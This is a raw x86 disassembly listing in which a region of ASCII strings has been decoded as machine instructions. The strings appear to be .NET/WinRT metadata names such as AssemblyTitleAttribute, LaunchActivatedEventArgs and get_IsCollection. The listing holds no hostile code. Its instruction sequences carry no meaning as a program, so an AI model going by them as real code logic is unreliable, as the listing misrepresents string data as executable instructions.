  403b94:	bound  ebp,QWORD PTR [ecx+edi*2+0x0]
  403b98:	push   esp
  403b99:	jns    0x403c0b
  403b9b:	gs push edx
  403b9d:	gs jae 0x403c0f
  403ba0:	ins    BYTE PTR es:[edi],dx
  403ba1:	jbe    0x403c08
  403ba3:	jb     0x403ba5
  403ba5:	inc    ebx
  403ba6:	jb     0x403c0d
  403ba8:	popa   
  403ba9:	je     0x403c10
  403bab:	pop    eax
  403bac:	popa   
  403bad:	ins    DWORD PTR es:[edi],dx
  403bae:	ins    BYTE PTR es:[edi],dx
  403baf:	dec    ebp
  403bb0:	gs ins DWORD PTR es:[edi],dx
  403bb2:	bound  esp,QWORD PTR [ebp+0x72]
  403bb5:	add    BYTE PTR [ecx+0x73],cl
  403bb8:	push   ebx
  403bb9:	jns    0x403c2e
  403bbb:	je     0x403c22
  403bbd:	ins    DWORD PTR es:[edi],dx
  403bbe:	push   esp
  403bbf:	jns    0x403c31
  403bc1:	add    BYTE PTR gs:[esi+0x75],ah
  403bc5:	ins    BYTE PTR es:[edi],dx
  403bc6:	ins    BYTE PTR es:[edi],dx
  403bc7:	dec    esi
  403bc8:	popa   
  403bc9:	ins    DWORD PTR es:[edi],dx
  403bca:	add    BYTE PTR gs:[ebp+0x6e],dh
  403bce:	fs gs jb 0x403c3e
  403bd2:	jns    0x403c3d
  403bd4:	outs   dx,BYTE PTR ds:[esi]
  403bd5:	addr16 push esp
  403bd7:	jns    0x403c49
  403bd9:	add    BYTE PTR gs:[edi+0x65],ah
  403bdd:	je     0x403c3e
  403bdf:	dec    ecx
  403be0:	jae    0x403c35
  403be2:	jns    0x403c57
  403be4:	je     0x403c4b
  403be6:	ins    DWORD PTR es:[edi],dx
  403be7:	push   esp
  403be8:	jns    0x403c5a
  403bea:	add    BYTE PTR gs:[edi+0x65],ah
  403bee:	je     0x403c4f
  403bf0:	inc    esi
  403bf1:	jne    0x403c5f
  403bf3:	ins    BYTE PTR es:[edi],dx
  403bf4:	dec    esi
  403bf5:	popa   
  403bf6:	ins    DWORD PTR es:[edi],dx
  403bf7:	add    BYTE PTR gs:[edi+0x65],ah
  403bfb:	je     0x403c5c
  403bfd:	dec    esi
  403bfe:	popa   
  403bff:	ins    DWORD PTR es:[edi],dx
  403c00:	add    BYTE PTR gs:[edi+0x65],ah
  403c04:	je     0x403c65
  403c06:	push   ebp
  403c07:	outs   dx,BYTE PTR ds:[esi]
  403c08:	fs gs jb 0x403c78
  403c0c:	jns    0x403c77
  403c0e:	outs   dx,BYTE PTR ds:[esi]
  403c0f:	addr16 push esp
  403c11:	jns    0x403c83
  403c13:	add    BYTE PTR gs:[edi+0x65],ah
  403c17:	je     0x403c78
  403c19:	inc    edx
  403c1a:	popa   
  403c1b:	jae    0x403c82
  403c1d:	push   esp
  403c1e:	jns    0x403c90
  403c20:	add    BYTE PTR gs:[edi+0x65],ah
  403c24:	je     0x403c85
  403c26:	inc    ebx
  403c27:	outs   dx,DWORD PTR ds:[esi]
  403c28:	outs   dx,BYTE PTR ds:[esi]
  403c29:	je     0x403c90
  403c2b:	outs   dx,BYTE PTR ds:[esi]
  403c2c:	je     0x403c7e
  403c2e:	jb     0x403c9f
  403c30:	jo     0x403c97
  403c32:	jb     0x403ca8
  403c34:	jns    0x403c36
  403c36:	inc    edi
  403c37:	gs je  0x403c87
  403c3a:	gs ins DWORD PTR es:[edi],dx
  403c3c:	bound  esp,QWORD PTR [ebp+0x72]
  403c3f:	add    BYTE PTR [edi+0x65],ah
  403c42:	je     0x403ca3
  403c44:	dec    ecx
  403c45:	jae    0x403c88
  403c47:	jb     0x403cbb
  403c49:	popa   
  403c4a:	jns    0x403c4c
  403c4c:	addr16 gs je 0x403caf
  403c50:	dec    ecx
  403c51:	jae    0x403c96
  403c53:	outs   dx,DWORD PTR ds:[esi]
  403c54:	ins    BYTE PTR es:[edi],dx
  403c55:	ins    BYTE PTR es:[edi],dx
  403c56:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  403c5b:	outs   dx,BYTE PTR ds:[esi]
  403c5c:	add    BYTE PTR [edi+0x65],ah
  403c5f:	je     0x403cc0
  403c61:	dec    ecx
  403c62:	jae    0x403ca7
  403c64:	outs   dx,DWORD PTR ds:[esi]
  403c65:	outs   dx,BYTE PTR ds:[esi]
  403c66:	jae    0x403cdc
  403c68:	jb     0x403cdf
  403c6a:	arpl   WORD PTR [ecx+ebp*2+0x62],si
  403c6e:	ins    BYTE PTR es:[edi],dx
  403c6f:	add    BYTE PTR gs:[edi+0x65],ah
  403c73:	je     0x403cd4
  403c75:	dec    ecx
  403c76:	jae    0x403cbc
  403c78:	imul   esp,DWORD PTR [ebx+0x74],0x616e6f69
  403c7f:	jb     0x403cfa
  403c81:	add    BYTE PTR [edi+0x65],ah
  403c84:	je     0x403ce5
  403c86:	dec    ecx
  403c87:	jae    0x403cd6
  403c89:	popa   
  403c8a:	jb     0x403cf7
  403c8c:	jne    0x403cfe
  403c8e:	inc    ebp
  403c8f:	js     0x403d05
  403c91:	outs   dx,BYTE PTR gs:[esi]
  403c93:	jae    0x403cfe
  403c95:	outs   dx,DWORD PTR ds:[esi]
  403c96:	outs   dx,BYTE PTR ds:[esi]
  403c97:	add    BYTE PTR [edi+0x65],ah
  403c9a:	je     0x403cfb
  403c9c:	dec    ecx
  403c9d:	je     0x403d04
  403c9f:	ins    DWORD PTR es:[edi],dx
  403ca0:	push   esp
  403ca1:	jns    0x403d13
  403ca3:	add    BYTE PTR gs:[edi+0x65],ah
  403ca7:	je     0x403d08
  403ca9:	dec    ebx
  403caa:	gs jns 0x403d01
  403cad:	jns    0x403d1f
  403caf:	add    BYTE PTR gs:[ecx+0x63],al
  403cb3:	je     0x403d1e
  403cb5:	jbe    0x403d18
  403cb7:	je     0x403d1e
  403cb9:	dec    ecx
  403cba:	outs   dx,BYTE PTR ds:[esi]
  403cbb:	jae    0x403d31
  403cbd:	popa   
  403cbe:	outs   dx,BYTE PTR ds:[esi]
  403cbf:	arpl   WORD PTR [ebp+0x0],sp
  403cc2:	inc    ecx
  403cc3:	fs fs push esp
  403cc6:	outs   dx,DWORD PTR ds:[esi]
  403cc7:	dec    ebp
  403cc8:	popa   
  403cc9:	jo     0x403ccb
  403ccb:	inc    ecx
  403ccc:	fs fs push esp
  403ccf:	outs   dx,DWORD PTR ds:[esi]
  403cd0:	push   esi
  403cd1:	arpl   WORD PTR gs:[edi+ebp*2+0x72],si
  403cd6:	add    BYTE PTR [edx+0x75],dl
  403cd9:	outs   dx,BYTE PTR ds:[esi]
  403cda:	dec    ecx
  403cdb:	outs   dx,BYTE PTR ds:[esi]
  403cdc:	imul   esi,DWORD PTR [ecx+ebp*2+0x61],0x657a696c
  403ce4:	jb     0x403ce6
  403ce6:	inc    ebx
  403ce7:	jb     0x403d4e
  403ce9:	popa   
  403cea:	je     0x403d51
  403cec:	inc    esi
  403ced:	jb     0x403d5e
  403cef:	ins    DWORD PTR es:[edi],dx
  403cf0:	push   ebx
  403cf1:	je     0x403d65
  403cf3:	imul   ebp,DWORD PTR [esi+0x67],0x74656700
  403cfa:	pop    edi
  403cfb:	dec    ecx
  403cfc:	jae    0x403d40
  403cfe:	imul   ebp,DWORD PTR [esi+0x64],0x656c6261
  403d05:	add    BYTE PTR [esi+0x75],al
  403d08:	ins    BYTE PTR es:[edi],dx
  403d09:	ins    BYTE PTR es:[edi],dx
  403d0a:	dec    esi
  403d0b:	popa   
  403d0c:	ins    DWORD PTR es:[edi],dx
  403d0d:	add    BYTE PTR gs:[esi+0x61],cl
  403d11:	ins    DWORD PTR es:[edi],dx
  403d12:	add    BYTE PTR gs:[ebp+0x6e],dl
  403d16:	fs gs jb 0x403d86
  403d1a:	jns    0x403d85
  403d1c:	outs   dx,BYTE PTR ds:[esi]
  403d1d:	addr16 push esp
  403d1f:	jns    0x403d91
  403d21:	add    BYTE PTR gs:[edx+0x61],al
  403d25:	jae    0x403d8c
  403d27:	push   esp
  403d28:	jns    0x403d9a
  403d2a:	add    BYTE PTR gs:[ebx+0x6f],al
  403d2e:	outs   dx,BYTE PTR ds:[esi]
  403d2f:	je     0x403d96
  403d31:	outs   dx,BYTE PTR ds:[esi]
  403d32:	je     0x403d84
  403d34:	jb     0x403da5
  403d36:	jo     0x403d9d
  403d38:	jb     0x403dae
  403d3a:	jns    0x403d3c
  403d3c:	dec    ecx
  403d3d:	jae    0x403d80
  403d3f:	jb     0x403db3
  403d41:	popa   
  403d42:	jns    0x403d44
  403d44:	dec    ecx
  403d45:	jae    0x403d8a
  403d47:	outs   dx,DWORD PTR ds:[esi]
  403d48:	ins    BYTE PTR es:[edi],dx
  403d49:	ins    BYTE PTR es:[edi],dx
  403d4a:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  403d4f:	outs   dx,BYTE PTR ds:[esi]
  403d50:	add    BYTE PTR [ecx+0x73],cl
  403d53:	inc    ebx
  403d54:	outs   dx,DWORD PTR ds:[esi]
  403d55:	outs   dx,BYTE PTR ds:[esi]
  403d56:	jae    0x403dcc
  403d58:	jb     0x403dcf
  403d5a:	arpl   WORD PTR [ecx+ebp*2+0x62],si
  403d5e:	ins    BYTE PTR es:[edi],dx
  403d5f:	add    BYTE PTR gs:[ecx+0x73],cl
  403d63:	inc    esp
  403d64:	imul   esp,DWORD PTR [ebx+0x74],0x616e6f69
  403d6b:	jb     0x403de6
  403d6d:	add    BYTE PTR [ecx+0x73],cl
  403d70:	dec    ebp
  403d71:	popa   
  403d72:	jb     0x403ddf
  403d74:	jne    0x403de6
  403d76:	inc    ebp
  403d77:	js     0x403ded
  403d79:	outs   dx,BYTE PTR gs:[esi]
  403d7b:	jae    0x403de6
  403d7d:	outs   dx,DWORD PTR ds:[esi]
  403d7e:	outs   dx,BYTE PTR ds:[esi]
  403d7f:	add    BYTE PTR [ecx+0x74],cl
  403d82:	gs ins DWORD PTR es:[edi],dx
  403d84:	push   esp
  403d85:	jns    0x403df7
  403d87:	add    BYTE PTR gs:[ebx+0x65],cl
  403d8b:	jns    0x403de1
  403d8d:	jns    0x403dff
  403d8f:	add    BYTE PTR gs:[ecx+0x73],cl
  403d93:	inc    edx
  403d94:	imul   ebp,DWORD PTR [esi+0x64],0x656c6261
  403d9b:	add    BYTE PTR [eax+0x72],dh
  403d9e:	outs   dx,DWORD PTR ds:[esi]
  403d9f:	jbe    0x403e0a
  403da1:	fs gs jb 0x403da5
  403da5:	bound  esp,QWORD PTR [ecx+0x73]
  403da8:	gs push esp
  403daa:	jns    0x403e1c
  403dac:	add    BYTE PTR gs:[ebx+0x6f],ah
  403db0:	outs   dx,BYTE PTR ds:[esi]
  403db1:	je     0x403e18
  403db3:	outs   dx,BYTE PTR ds:[esi]
  403db4:	je     0x403e06
  403db6:	jb     0x403e27
  403db8:	jo     0x403e1f
  403dba:	jb     0x403e30
  403dbc:	jns    0x403e0c
  403dbe:	popa   
  403dbf:	ins    DWORD PTR es:[edi],dx
  403dc0:	add    BYTE PTR gs:[ecx+0x74],ch
  403dc4:	gs ins DWORD PTR es:[edi],dx
  403dc6:	push   esp
  403dc7:	jns    0x403e39
  403dc9:	gs dec esi
  403dcb:	popa   
  403dcc:	ins    DWORD PTR es:[edi],dx
  403dcd:	add    BYTE PTR gs:[ebx+0x65],ch
  403dd1:	jns    0x403e27
  403dd3:	jns    0x403e45
  403dd5:	gs dec esi
  403dd7:	popa   
  403dd8:	ins    DWORD PTR es:[edi],dx
  403dd9:	add    BYTE PTR gs:[ebx+0x6f],al
  403ddd:	outs   dx,BYTE PTR ds:[esi]
  403dde:	jae    0x403e54
  403de0:	jb     0x403e57
  403de2:	arpl   WORD PTR [edi+ebp*2+0x72],si
  403de6:	dec    ecx
  403de7:	outs   dx,BYTE PTR ds:[esi]
  403de8:	outs   dx,WORD PTR ds:[esi]
  403dea:	add    BYTE PTR [ebx+0x6f],ah
  403ded:	outs   dx,BYTE PTR ds:[esi]
  403dee:	jae    0x403e64
  403df0:	jb     0x403e67
  403df2:	arpl   WORD PTR [edi+ebp*2+0x72],si
  403df6:	add    BYTE PTR [ebp+0x65],cl
  403df9:	je     0x403e63
  403dfb:	outs   dx,DWORD PTR ds:[esi]
  403dfc:	fs dec ecx
  403dfe:	outs   dx,BYTE PTR ds:[esi]
  403dff:	outs   dx,WORD PTR ds:[esi]
  403e01:	add    BYTE PTR [ecx+ebp*2+0x63],ah
  403e05:	je     0x403e70
  403e07:	outs   dx,DWORD PTR ds:[esi]
  403e08:	outs   dx,BYTE PTR ds:[esi]
  403e09:	popa   
  403e0a:	jb     0x403e85
  403e0c:	inc    ecx
  403e0d:	fs fs dec ebp
  403e10:	gs je  0x403e7b
  403e13:	outs   dx,DWORD PTR ds:[esi]
  403e14:	add    BYTE PTR fs:[ebx+0x6f],ah
  403e18:	ins    BYTE PTR es:[edi],dx
  403e19:	ins    BYTE PTR es:[edi],dx
  403e1a:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  403e1f:	outs   dx,BYTE PTR ds:[esi]
  403e20:	inc    ecx
  403e21:	fs fs dec ebp
  403e24:	gs je  0x403e8f
  403e27:	outs   dx,DWORD PTR ds:[esi]
  403e28:	add    BYTE PTR fs:[ebp+0x65],cl
  403e2c:	ins    DWORD PTR es:[edi],dx
  403e2d:	bound  esp,QWORD PTR [ebp+0x72]
  403e30:	dec    ecx
  403e31:	outs   dx,BYTE PTR ds:[esi]
  403e32:	outs   dx,WORD PTR ds:[esi]
  403e34:	add    BYTE PTR [edi+0x65],al
  403e37:	je     0x403e7a
  403e39:	je     0x403eaf
  403e3b:	jb     0x403ea6
  403e3d:	bound  esi,QWORD PTR [ebp+0x74]
  403e40:	gs dec esi
  403e42:	popa   
  403e43:	ins    DWORD PTR es:[edi],dx
  403e44:	gs fs push esi
  403e47:	popa   
  403e48:	ins    BYTE PTR es:[edi],dx
  403e49:	jne    0x403eb0
  403e4b:	add    BYTE PTR [ecx+0x74],al
  403e4e:	je     0x403ec2
  403e50:	imul   esp,DWORD PTR [edx+0x75],0x54006574
  403e57:	add    BYTE PTR [esi+0x61],ch
  403e5a:	ins    DWORD PTR es:[edi],dx
  403e5b:	add    BYTE PTR gs:[ecx+edi*2+0x70],dh
  403e60:	add    BYTE PTR gs:[eax+0x72],dl
  403e64:	outs   dx,DWORD PTR ds:[esi]
  403e65:	jo     0x403ecc
  403e67:	jb     0x403edd
  403e69:	jns    0x403eb4
  403e6b:	outs   dx,BYTE PTR ds:[esi]
  403e6c:	outs   dx,WORD PTR ds:[esi]
  403e6e:	add    BYTE PTR [eax+0x72],dh
  403e71:	outs   dx,DWORD PTR ds:[esi]
  403e72:	jo     0x403ed9
  403e74:	jb     0x403eea
  403e76:	jns    0x403ec1
  403e78:	outs   dx,BYTE PTR ds:[esi]
  403e79:	outs   dx,WORD PTR ds:[esi]
  403e7b:	add    BYTE PTR [edi+0x65],ah
  403e7e:	je     0x403edf
  403e80:	push   esp
  403e81:	jns    0x403ef3
  403e83:	add    BYTE PTR gs:[edi+0x65],ah
  403e87:	je     0x403ee8
  403e89:	push   esp
  403e8a:	popa   
  403e8b:	jb     0x403ef4
  403e8d:	gs je  0x403ee4
  403e90:	jns    0x403f02
  403e92:	add    BYTE PTR gs:[edi+0x65],ah
  403e96:	je     0x403ef7
  403e98:	dec    ecx
  403e99:	jae    0x403edc
  403e9b:	je     0x403f11
  403e9d:	popa   
  403e9e:	arpl   WORD PTR [eax+0x61],bp
  403ea1:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  403ea5:	addr16 gs je 0x403f08
  403ea9:	dec    ecx
  403eaa:	jae    0x403ef0
  403eac:	gs jo  0x403f14
  403eaf:	outs   dx,BYTE PTR ds:[esi]
  403eb0:	fs outs dx,BYTE PTR gs:[esi]
  403eb3:	arpl   WORD PTR [ecx+0x50],di
  403eb6:	jb     0x403f27
  403eb8:	jo     0x403f1f
  403eba:	jb     0x403f30
  403ebc:	jns    0x403ebe
  403ebe:	addr16 gs je 0x403f21
  403ec2:	dec    ecx
  403ec3:	jae    0x403f17
  403ec5:	gs popa 
  403ec7:	fs dec edi
  403ec9:	outs   dx,BYTE PTR ds:[esi]
  403eca:	ins    BYTE PTR es:[edi],dx
  403ecb:	jns    0x403ecd
  403ecd:	inc    edi
  403ece:	gs je  0x403f27
  403ed1:	popa   
  403ed2:	ins    BYTE PTR es:[edi],dx
  403ed3:	jne    0x403f3a
  403ed5:	add    BYTE PTR [ebx+0x65],dl
  403ed8:	je     0x403f30
  403eda:	popa   
  403edb:	ins    BYTE PTR es:[edi],dx
  403edc:	jne    0x403f43
  403ede:	add    BYTE PTR [ecx+eiz*2+0x72],dl
  403ee2:	addr16 gs je 0x403f3a
  403ee6:	jns    0x403f58
  403ee8:	add    BYTE PTR gs:[ecx+0x73],cl
  403eec:	inc    ecx
  403eed:	je     0x403f63
  403eef:	popa   
  403ef0:	arpl   WORD PTR [eax+0x61],bp
  403ef3:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  403ef7:	dec    ecx
  403ef8:	jae    0x403f3e
  403efa:	gs jo  0x403f62
  403efd:	outs   dx,BYTE PTR ds:[esi]
  403efe:	fs outs dx,BYTE PTR gs:[esi]
  403f01:	arpl   WORD PTR [ecx+0x50],di
  403f04:	jb     0x403f75
  403f06:	jo     0x403f6d
  403f08:	jb     0x403f7e
  403f0a:	jns    0x403f0c
  403f0c:	dec    ecx
  403f0d:	jae    0x403f61
  403f0f:	gs popa 
  403f11:	fs dec edi
  403f13:	outs   dx,BYTE PTR ds:[esi]
  403f14:	ins    BYTE PTR es:[edi],dx
  403f15:	jns    0x403f17
  403f17:	dec    ebp
  403f18:	popa   
  403f19:	imul   ebp,DWORD PTR [esi+0x0],0x6c6d6178
  403f20:	dec    ecx
  403f21:	outs   dx,BYTE PTR ds:[esi]
  403f22:	outs   dx,WORD PTR ds:[esi]
  403f24:	push   eax
  403f25:	jb     0x403f96
  403f27:	jbe    0x403f92
  403f29:	fs gs jb 0x403f2d
  403f2d:	gs js  0x403f95
  403f30:	arpl   WORD PTR [ebp+0x74],si
  403f33:	popa   
  403f34:	bound  ebp,QWORD PTR [ebp+eiz*2+0x45]
  403f38:	js     0x403fae
  403f3a:	outs   dx,BYTE PTR gs:[esi]
  403f3c:	jae    0x403fa7
  403f3e:	outs   dx,DWORD PTR ds:[esi]
  403f3f:	outs   dx,BYTE PTR ds:[esi]
  403f40:	jae    0x403f42
  403f42:	jo     0x403fb0
  403f44:	popa   
  403f45:	je     0x403fad
  403f47:	outs   dx,DWORD PTR ds:[esi]
  403f48:	jb     0x403fb7
  403f4a:	inc    ecx
  403f4b:	jae    0x403fc0
  403f4d:	gs ins DWORD PTR es:[edi],dx
  403f4f:	bound  ebp,QWORD PTR [ecx+ebp*2+0x65]
  403f53:	jae    0x403f55
  403f55:	dec    esp
  403f56:	outs   dx,DWORD PTR ds:[esi]
  403f57:	popa   
  403f58:	fs push ebp
  403f5a:	jae    0x403fc1
  403f5c:	jb     0x403f9f
  403f5e:	jae    0x403fd3
  403f60:	gs ins DWORD PTR es:[edi],dx
  403f62:	bound  ebp,QWORD PTR [ecx+ebp*2+0x65]
  403f66:	jae    0x403f68
  403f68:	inc    edi
  403f69:	gs je  0x403fc4
  403f6c:	popa   
  403f6d:	ins    DWORD PTR es:[edi],dx
  403f6e:	ins    BYTE PTR es:[edi],dx
  403f6f:	push   esp
  403f70:	jns    0x403fe2
  403f72:	add    BYTE PTR gs:[eax+0x6d],bl
  403f76:	ins    BYTE PTR es:[edi],dx
  403f77:	outs   dx,BYTE PTR ds:[esi]
  403f78:	jae    0x403fbe
  403f7a:	imul   bp,WORD PTR gs:[esi+0x69],0x6974
  403f81:	outs   dx,DWORD PTR ds:[esi]
  403f82:	outs   dx,BYTE PTR ds:[esi]
  403f83:	add    BYTE PTR [edi+0x65],al
  403f86:	je     0x403fe0
  403f88:	ins    DWORD PTR es:[edi],dx
  403f89:	ins    BYTE PTR es:[edi],dx
  403f8a:	outs   dx,BYTE PTR ds:[esi]
  403f8b:	jae    0x403fd1
  403f8d:	imul   bp,WORD PTR gs:[esi+0x69],0x6974
  403f94:	outs   dx,DWORD PTR ds:[esi]
  403f95:	outs   dx,BYTE PTR ds:[esi]
  403f96:	jae    0x403f98
  403f98:	push   edi
  403f99:	imul   ebp,DWORD PTR [esi+0x64],0x2e73776f
  403fa0:	inc    ecx
  403fa1:	jo     0x404013
  403fa3:	ins    BYTE PTR es:[edi],dx
  403fa4:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  403fab:	dec    ebp
  403fac:	outs   dx,DWORD PTR ds:[esi]
  403fad:	fs gs ins BYTE PTR es:[edi],dx
  403fb0:	cs inc ecx
  403fb2:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  403fb6:	popa   
  403fb7:	je     0x404022
  403fb9:	outs   dx,DWORD PTR ds:[esi]
  403fba:	outs   dx,BYTE PTR ds:[esi]
  403fbb:	add    BYTE PTR [ecx+eiz*2+0x75],cl
  403fbf:	outs   dx,BYTE PTR ds:[esi]
  403fc0:	arpl   WORD PTR [eax+0x41],bp
  403fc3:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  403fc7:	popa   
  403fc8:	je     0x40402f
  403fca:	fs inc ebp
  403fcc:	jbe    0x404033
  403fce:	outs   dx,BYTE PTR ds:[esi]
  403fcf:	je     0x404012
  403fd1:	jb     0x40403a
  403fd3:	jae    0x403fd5
  403fd5:	dec    edi
  403fd6:	outs   dx,BYTE PTR ds:[esi]
  403fd7:	dec    esp
  403fd8:	popa   
  403fd9:	jne    0x404049
  403fdb:	arpl   WORD PTR [eax+0x65],bp
  403fde:	add    BYTE PTR fs:[ecx+edi*2+0x70],dh
  403fe3:	gs inc esi
  403fe5:	jne    0x404053
  403fe7:	ins    BYTE PTR es:[edi],dx
  403fe8:	dec    esi
  403fe9:	popa   
  403fea:	ins    DWORD PTR es:[edi],dx
  403feb:	add    BYTE PTR gs:[ebp+0x65],ch
  403fef:	ins    DWORD PTR es:[edi],dx
  403ff0:	bound  esp,QWORD PTR [ebp+0x72]
  403ff3:	dec    esi
  403ff4:	popa   
  403ff5:	ins    DWORD PTR es:[edi],dx
  403ff6:	add    BYTE PTR gs:[ecx+0x73],ah
  403ffa:	jae    0x404061
  403ffc:	ins    DWORD PTR es:[edi],dx
  403ffd:	bound  ebp,QWORD PTR [ecx+edi*2+0x0]
  404001:	je     0x40407c
  404003:	jo     0x40406a
  404005:	dec    esi
  404006:	popa   
  404007:	ins    DWORD PTR es:[edi],dx
  404008:	add    BYTE PTR gs:[ebx+0x61],ah
  40400c:	jae    0x404073
  40400e:	push   ebx
  40400f:	outs   dx,BYTE PTR gs:[esi]
  404011:	jae    0x40407c
  404013:	je     0x40407e
  404015:	jbe    0x40407c
  404017:	add    BYTE PTR [edi+ebp*2+0x6e],ch
  40401b:	addr16 dec ebp
  40401d:	gs ins DWORD PTR es:[edi],dx
  40401f:	bound  esp,QWORD PTR [ebp+0x72]
  404022:	dec    esi
  404023:	popa   
  404024:	ins    DWORD PTR es:[edi],dx
  404025:	add    BYTE PTR gs:[edx+0x65],dh
  404029:	jae    0x40409a
  40402b:	ins    BYTE PTR es:[edi],dx
  40402c:	jbe    0x404093
  40402e:	fs push esp
  404030:	jns    0x4040a2
  404032:	add    BYTE PTR gs:[ecx+0x6e],ch
  404036:	jae    0x4040ac
  404038:	popa   
  404039:	outs   dx,BYTE PTR ds:[esi]
  40403a:	arpl   WORD PTR [ebp+0x0],sp
  40403d:	imul   esp,DWORD PTR [ebp+0x79],0x0
  404041:	imul   esi,DWORD PTR [ebp+eiz*2+0x6d],0x6c617600
  404049:	jne    0x4040b0
  40404b:	add    BYTE PTR [esi+0x75],ah
  40404e:	ins    BYTE PTR es:[edi],dx
  40404f:	ins    BYTE PTR es:[edi],dx
  404050:	push   esp
  404051:	jns    0x4040c3
  404053:	add    BYTE PTR gs:[ebp+0x65],ch
  404057:	ins    DWORD PTR es:[edi],dx
  404058:	bound  esp,QWORD PTR [ebp+0x72]
  40405b:	dec    ecx
  40405c:	outs   dx,BYTE PTR ds:[esi]
  40405d:	outs   dx,WORD PTR ds:[esi]
  40405f:	add    BYTE PTR [esi+0x61],ch
  404062:	ins    DWORD PTR es:[edi],dx
  404063:	gs fs push esi
  404066:	popa   
  404067:	ins    BYTE PTR es:[edi],dx
  404068:	jne    0x4040cf
  40406a:	dec    esi
  40406b:	popa   
  40406c:	ins    DWORD PTR es:[edi],dx
  40406d:	add    BYTE PTR gs:[ecx+0x72],ah
  404071:	addr16 jae 0x404074
  404074:	jb     0x4040eb
  404076:	outs   dx,BYTE PTR ds:[esi]
  404077:	je     0x4040e2
  404079:	ins    DWORD PTR es:[edi],dx
  40407a:	gs inc ebx
  40407c:	ins    BYTE PTR es:[edi],dx
  40407d:	popa   
  40407e:	jae    0x4040f3
  404080:	dec    esi
  404081:	popa   
  404082:	ins    DWORD PTR es:[edi],dx
  404083:	add    BYTE PTR gs:[ebx+0x79],dl
  404087:	jae    0x4040fd
  404089:	gs ins DWORD PTR es:[edi],dx
  40408b:	cs push edx
  40408d:	jne    0x4040fd
  40408f:	je     0x4040fa
  404091:	ins    DWORD PTR es:[edi],dx
  404092:	gs cs push esi
  404095:	gs jb  0x40410b
  404098:	imul   ebp,DWORD PTR [edi+0x6e],0x676e69
  40409f:	push   esp
  4040a0:	popa   
  4040a1:	jb     0x40410a
  4040a3:	gs je  0x4040ec
  4040a6:	jb     0x404109
  4040a8:	ins    DWORD PTR es:[edi],dx
  4040a9:	gs ja  0x40411b
  4040ac:	jb     0x404119
  4040ae:	inc    ecx
  4040af:	je     0x404125
  4040b1:	jb     0x40411c
  4040b3:	bound  esi,QWORD PTR [ebp+0x74]
  4040b6:	add    BYTE PTR gs:[ebx+0x79],dl
  4040ba:	jae    0x404130
  4040bc:	gs ins DWORD PTR es:[edi],dx
  4040be:	cs push edx
  4040c0:	jne    0x404130
  4040c2:	je     0x40412d
  4040c4:	ins    DWORD PTR es:[edi],dx
  4040c5:	gs cs dec ecx
  4040c8:	outs   dx,BYTE PTR ds:[esi]
  4040c9:	je     0x404130
  4040cb:	jb     0x40413c
  4040cd:	jo     0x404122
  4040cf:	gs jb  0x404148
  4040d2:	imul   esp,DWORD PTR [ebx+0x65],0x6f430073
  4040d9:	ins    DWORD PTR es:[edi],dx
  4040da:	push   esi
  4040db:	imul   esi,DWORD PTR [ebx+0x69],0x41656c62
  4040e2:	je     0x404158
  4040e4:	jb     0x40414f
  4040e6:	bound  esi,QWORD PTR [ebp+0x74]
  4040e9:	add    BYTE PTR gs:[ebx+0x4c],al
  4040ed:	push   ebx
  4040ee:	inc    ebx
  4040ef:	outs   dx,DWORD PTR ds:[esi]
  4040f0:	ins    DWORD PTR es:[edi],dx
  4040f1:	jo     0x40415f
  4040f3:	imul   esp,DWORD PTR [ecx+0x6e],0x74744174
  4040fa:	jb     0x404165
  4040fc:	bound  esi,QWORD PTR [ebp+0x74]
  4040ff:	add    BYTE PTR gs:[ecx+0x73],al
  404103:	jae    0x40416a
  404105:	ins    DWORD PTR es:[edi],dx
  404106:	bound  ebp,QWORD PTR [ecx+edi*2+0x54]
  40410a:	imul   esi,DWORD PTR [esp+ebp*2+0x65],0x72747441
  404112:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  404119:	jae    0x40418e
  40411b:	gs ins DWORD PTR es:[edi],dx
  40411d:	bound  ebp,QWORD PTR [ecx+edi*2+0x44]
  404121:	gs jae 0x404187
  404124:	jb     0x40418f
  404126:	jo     0x40419c
  404128:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  40412f:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  404136:	jae    0x4041ab
  404138:	gs ins DWORD PTR es:[edi],dx
  40413a:	bound  ebp,QWORD PTR [ecx+edi*2+0x44]
  40413e:	gs popaw 
  404141:	jne    0x4041af
  404143:	je     0x404186
  404145:	ins    BYTE PTR es:[edi],dx
  404146:	imul   esp,DWORD PTR [ecx+0x73],0x72747441
  40414d:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  404154:	jae    0x4041c9
  404156:	gs ins DWORD PTR es:[edi],dx
  404158:	bound  ebp,QWORD PTR [ecx+edi*2+0x43]
  40415c:	outs   dx,DWORD PTR ds:[esi]
  40415d:	ins    DWORD PTR es:[edi],dx
  40415e:	jo     0x4041c1
  404160:	outs   dx,BYTE PTR ds:[esi]
  404161:	jns    0x4041a4
  404163:	je     0x4041d9
  404165:	jb     0x4041d0
  404167:	bound  esi,QWORD PTR [ebp+0x74]
  40416a:	add    BYTE PTR gs:[ecx+0x73],al
  40416e:	jae    0x4041d5
  404170:	ins    DWORD PTR es:[edi],dx
  404171:	bound  ebp,QWORD PTR [ecx+edi*2+0x50]
  404175:	jb     0x4041e6
  404177:	fs jne 0x4041dd
  40417a:	je     0x4041bd
  40417c:	je     0x4041f2
  40417e:	jb     0x4041e9
  404180:	bound  esi,QWORD PTR [ebp+0x74]
  404183:	add    BYTE PTR gs:[ecx+0x73],al
  404187:	jae    0x4041ee
  404189:	ins    DWORD PTR es:[edi],dx
  40418a:	bound  ebp,QWORD PTR [ecx+edi*2+0x43]
  40418e:	outs   dx,DWORD PTR ds:[esi]
  40418f:	jo     0x40420a
  404191:	jb     0x4041fc
  404193:	addr16 push 0x74744174
  404199:	jb     0x404204
  40419b:	bound  esi,QWORD PTR [ebp+0x74]
  40419e:	add    BYTE PTR gs:[ecx+0x73],al
  4041a2:	jae    0x404209
  4041a4:	ins    DWORD PTR es:[edi],dx
  4041a5:	bound  ebp,QWORD PTR [ecx+edi*2+0x56]
  4041a9:	gs jb  0x40421f
